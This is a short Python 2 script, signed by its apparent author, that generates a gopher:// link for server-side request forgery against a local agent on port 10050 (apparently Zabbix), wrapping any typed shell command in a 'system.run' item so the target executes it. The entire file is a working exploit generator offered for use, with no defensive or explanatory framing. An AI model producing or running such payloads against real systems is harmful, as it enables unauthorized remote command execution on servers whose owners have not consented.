import urllib

command = raw_input("Enter Shell Command to Execute: ")

if(not command):
    command = "ls"

payload = "system.run[("  + command + ");sleep 2s]"
finalpayload = urllib.quote_plus(payload).replace("+","%20").replace("%2F","/").replace("%25","%").replace("%3A",":")

print "\nYour gopher link is ready to do SSRF: \n"
print "gopher://127.0.0.1:10050/_" + finalpayload
print "\n-----------Made-by-SpyD3r-----------\n"
